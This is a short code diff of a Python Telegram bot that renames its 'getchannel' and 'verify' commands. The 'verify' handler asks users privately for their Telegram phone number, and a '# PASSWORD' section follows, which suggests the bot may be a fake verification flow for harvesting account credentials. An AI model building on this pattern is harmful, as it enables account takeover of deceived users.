@@ -77,7 +77,7 @@ FREE_BUTTON = [
             ],
         ]
 
-@app.on_message(filters.command("getchannel") & filters.private)
+@app.on_message(filters.command("JoinChannels") & filters.private)
 async def free(_, message):
     text = FREE_MESSAGE
     reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
@@ -89,7 +89,7 @@ async def free(_, message):
 
 # VWRIF CMD
 
-@app.on_message(filters.command("verif") & filters.private)
+@app.on_message(filters.command("verify") & filters.private)
 async def verip(_, message):
     await app.send_message(message.chat.id, "Please send your telegram phone number…")
 # PASSWORD 
